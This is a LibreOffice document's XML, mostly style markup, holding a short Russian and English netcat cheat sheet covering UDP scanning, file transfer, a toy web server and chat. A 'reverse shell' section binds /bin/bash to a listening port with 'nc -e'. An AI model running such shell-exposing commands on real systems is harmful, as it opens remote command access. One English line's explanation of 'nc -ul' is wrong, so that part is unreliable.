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ospace"/>
    <style:font-face style:name="Lohit Devanagari1" svg:font-family="'Lohit Devanagari'"/>
    <style:font-face style:name="Menlo" svg:font-family="Menlo, Monaco, Consolas, 'Courier New', Courier, monospace"/>
    <style:font-face style:name="Nunito" svg:font-family="Nunito, sans-serif"/>
    <style:font-face style:name="Open Sans" svg:font-family="'Open Sans', sans-serif"/>
    <style:font-face style:name="Stolzl" svg:font-family="Stolzl, sans-serif"/>
    <style:font-face style:name="apple-system" svg:font-family="apple-system, BlinkMacSystemFont, Arial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margin-left="0in" fo:margin-right="0in" fo:orphans="2" fo:widows="2" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="Liberation Serif" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-name-asian="Noto Serif CJK SC" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="Lohit Devanagari" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <loext:graphic-properties draw:fill="solid" draw:fill-color="#f7f7f7" draw:opacity="100%"/>
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false" fo:line-height="160%" fo:orphans="2" fo:widows="2" fo:text-indent="0in" style:auto-text-indent="false" fo:background-color="#f7f7f7" fo:padding-left="0.2083in" fo:padding-right="0in" fo:padding-top="0.1772in" fo:padding-bottom="0.1772in" fo:border-left="0.06pt solid #f0f0f0" fo:border-right="none" fo:border-top="0.06pt solid #f0f0f0" fo:border-bottom="0.06pt solid #f0f0f0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c9211e" style:font-name="Consolas" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P4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c9211e" style:font-name="Consolas" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:orphans="2" fo:widows="2" fo:text-indent="0in" style:auto-text-indent="false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apple-system" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal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c9211e" style:font-name="Nunito" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal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c9211e" style:font-name="Nunito" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal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Nunito" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10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c9211e" style:font-name="Stolzl" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P1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c9211e" style:font-name="Nunito" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P1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1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33333" style:font-name="apple-system" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P1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5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0972in" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#333333" style:font-name="Menlo" fo:font-style="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#4d4d4c" style:font-name="Menlo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333333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fo:color="#333333" style:font-name="Menlo" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="Menlo" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001c7cb8" style:font-weight-asian="normal" style:font-weight-complex="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="Menlo" fo:font-size="12.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001c7cb8" style:font-name-asian="Noto Sans Mono CJK SC" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-name-complex="Liberation Mono" style:font-size-complex="10pt" style:font-weight-complex="normal" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#548eaa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1d2330" style:font-name="Stolzl" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1d2330" style:font-name="monospace" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Stolzl" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="monospace" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#c9211e" style:font-name="Stolzl" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#c9211e" style:font-name="monospace" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="001c7cb8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Сканирование UDP-портов.</text:h>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Для сканирования UDP портов с помощью nmap необходимы root привилегии. Если их нет — в этом случае нам тоже может помочь утилита netcat:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ nc -vnzu 192.168.1.100 5550-5560</text:span></text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Отправка UDP-пакета</text:h>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ echo -n "foo" | nc -u -w1 192.168.1.100 161</text:span></text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Прием данных на UDP-порту и вывод принятых данных</text:h>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ nc -u localhost 7777</text:span></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">После первого сообщения вывод будет остановлен. Если необходимо принять несколько сообщений, то необходимо использовать while true:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ while true; do nc -u localhost 7777; done</text:span></text:span></text:p>
      <text:p text:style-name="P13">Передача файлов. С помощью netcat можно как получать файлы, так и передавать на удаленный хост:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">nc 192.168.1.100 5555 &lt; 1.txt</text:span></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">nc -lvp 5555 &gt; /tmp/1.txt</text:span></text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Netcact в роли простейшего веб-сервера.</text:h>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Netcat может выполнять роль простейшего веб-сервера для отображения html странички.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ while true; do nc -lp 8888 &lt; index.html; done</text:span></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">C помощью браузера по адресу: </text:span><text:a xlink:type="simple" xlink:href="http://xn--n1agdj/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://хост</text:a><text:span text:style-name="T7"> </text:span><text:span text:style-name="T3">netcat:8888/index.html. Для использования стандартного порта веб-сервера под номером 80 вам придется запустить nc c root привелегиями:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ while true; do sudo nc -lp 80 &lt; test.html; done</text:span></text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Чат между узлами</text:h>
      <text:p text:style-name="P14"><text:span text:style-name="T3">На первом узле (192.168.1.100):</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ nc -lp 9000</text:span></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">На втором узле:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ nc 192.168.1.100 9000</text:span></text:span></text:p>
      <text:p text:style-name="P6">После выполнения команд все символы, введенные в окно терминала на любом из узлов появятся в окне терминала другого узла.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:h text:style-name="P1" text:outline-level="3">Реверс-шелл</text:h>
      <text:p text:style-name="P14"><text:span text:style-name="T3">С помощью netcat можно организовать удобный реверс-шелл:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">nc -e /bin/bash -lp 4444</text:span></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Теперь можно соединиться с удаленного узла:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">$ nc 192.168.1.100 4444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0">Для тестирования UDP-соединений используйте следующие шаги:</text:p>
      <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T12">1. </text:span></text:span><text:span text:style-name="T12">Запустите Netcat в режиме сервера, прослушивающего определенный порт для UDP-данных:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">nc -ul порт</text:span></text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13"/></text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T12">2. </text:span></text:span><text:span text:style-name="T12">Запустите Netcat в режиме клиента, отправляющего UDP-данные на сервер:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">nc -u хост порт </text:span></text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P11">To send UDP packets with netcat, use the -ul option:</text:p>
      <text:p text:style-name="P3">nc -ul -p 127.0.0.1 1234</text:p>
      <text:p text:style-name="P7">This will send a UDP packet to IP 127.0.0.1 on port 1234.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4">nc -u -w1 127.0.0.1 1234</text:p>
      <text:p text:style-name="P8">This command sends a UDP packet to IP address 127.0.0.1 on port 1234 without the need to bind to a local port.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9">Используемые опции:</text:p>
      <text:p text:style-name="P9">–z указывает, что нужно выполнить сканирование удаленного порта службы, фактически не отправляя данные</text:p>
      <text:p text:style-name="P9">-v – включает подробный режим</text:p>
      <text:p text:style-name="P9">-n – позволяет пропустить поиск в DNS (сканирование выполнится быстрее)</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">nmap -s</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">U</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> 192.168.0.1-192.168.0.52</text:span>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ospace"/>
    <style:font-face style:name="Lohit Devanagari1" svg:font-family="'Lohit Devanagari'"/>
    <style:font-face style:name="Menlo" svg:font-family="Menlo, Monaco, Consolas, 'Courier New', Courier, monospace"/>
    <style:font-face style:name="Nunito" svg:font-family="Nunito, sans-serif"/>
    <style:font-face style:name="Open Sans" svg:font-family="'Open Sans', sans-serif"/>
    <style:font-face style:name="Stolzl" svg:font-family="Stolzl, sans-serif"/>
    <style:font-face style:name="apple-system" svg:font-family="apple-system, BlinkMacSystemFont, Arial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9T13:50:29.869725285</meta:creation-date>
    <meta:generator>LibreOffice/6.4.7.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
    <dc:date>2024-01-19T15:03:47.404697255</dc:date>
    <meta:editing-duration>PT52M53S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="43" meta:word-count="341" meta:character-count="2189" meta:non-whitespace-character-count="1887"/>
  </office:meta>
</office:document-meta>
</file>